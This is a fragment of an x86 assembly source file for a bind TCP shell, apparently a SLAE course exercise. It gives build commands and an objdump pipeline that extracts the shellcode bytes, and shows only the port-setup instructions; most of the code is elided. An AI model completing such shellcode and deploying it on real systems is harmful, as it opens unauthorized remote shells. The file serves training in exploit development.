; Filename:      bind_tcp_shell_int.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  05.12.2018
; Note:          x86 code but assembled and linked on x64
; Assembler:     nasm -f elf32 bind_tcp_shell_int.nasm -o bind_tcp_shell_int.o
; Linker:        ld -m elf_i386 bind_tcp_shell_int.o -o bind_tcp_shell_int
; Assembly dump: objdump -d ./bind_tcp_shell_int|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
...
_start:
	...
	mov ax, 666       ; Set the TCP port in Decimal
	bswap eax         ; Swap byte 0x0000029A -> 0x9A020000
	add eax, 2        ; Add 2 for AF_INET = 2
